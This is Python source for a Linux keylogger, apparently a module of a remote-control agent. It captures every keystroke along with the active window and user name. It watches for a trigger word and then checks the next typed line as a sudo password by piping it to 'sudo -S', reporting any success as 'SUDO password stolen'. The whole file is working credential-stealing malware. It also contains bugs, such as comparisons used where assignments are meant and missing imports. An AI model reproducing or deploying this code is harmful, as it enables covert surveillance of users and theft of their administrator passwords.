def keylog(task_id):

    from pynput import keyboard
    import threading

    import Xlib
    import Xlib.display
    import time
    import subprocess

    global responses   

    def keylogger():

        
        def on_press(key):
            global line
            global nextIsPsw
            global sudo

            display = Xlib.display.Display()
            root = display.screen().root
            windowID = root.get_full_property(display.intern_atom('_NET_ACTIVE_WINDOW'), Xlib.X.AnyPropertyType).value[0]
            window = display.create_resource_object('window', windowID)
            window_title = window.get_wm_class()[1]


            if key == keyboard.Key.esc:

                response = {
                        "task_id": task_id,
                        "user": getpass.getuser(), 
                        "window_title": window_title, 
                        "keystrokes": line,
                        "completed": True
                    }
                
                responses.append(responses)
                line = ""
                return False
            try:
                line = line + key.char
                k = key.char

            except:
                try:
                    k = key.name

                    if key.name == "backspace":
                        if len(line) > 0:
                            line = line[:-1]

                    elif key.name == "enter":

                        if nextIsPsw == True:

                            subprocess.call('echo ' + line + ' | sudo -S touch fileToCheckSudo', shell=True)

                            print("[FILE CREATO]: " + line)

                            with open('out.txt','w+') as fout:
                                with open('err.txt','w+') as ferr:
                                    out=subprocess.call(["ls",'fileToCheckSudo'],stdout=fout,stderr=ferr)
                                    fout.flush()
                                    ferr.flush()
                                    fout.close()
                                    ferr.close()

                            f = open("out.txt", "r")
                            output = f.read()
                            f.flush()
                            f.close()
                            os.remove("out.txt")
                            os.remove("err.txt")
                            os.remove("fileToCheckSudo")

                            if "fileToCheckSudo" in output:
                                response = {
                                        "task_id": task_id,
                                        "user_output": "SUDO password stolen: " + line,
                                        "user": getpass.getuser(),
                                        "window_title": window_title, 
                                        "keystrokes": line,
                                        "completed": True
                                    }
                                responses.append(response)
                                nextIsPsw == False
                                sudo = line
                                line = ""
                                return False
                            else:
                                print("[NO PASSWORD]")
                                nextIsPsw == False                            

                        if 'sudospace' in line:
                            nextIsPsw = True


                        display = Xlib.display.Display()
                        root = display.screen().root
                        windowID = root.get_full_property(display.intern_atom('_NET_ACTIVE_WINDOW'), Xlib.X.AnyPropertyType).value[0]
                        window = display.create_resource_object('window', windowID)
                        window_title = window.get_wm_class()[1]

                        response = {
                                "task_id": task_id,
                                "user": getpass.getuser(), 
                                "window_title": window_title, 
                                "keystrokes": line,
                            }
                        responses.append(response)
                        line = ""
                    else:
                        line = line + key.name
                except:
                    pass
                
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()

    

    thread2 = threading.Thread(target=keylogger, args=())
    thread2.start()

line = ""
nextIsPsw = False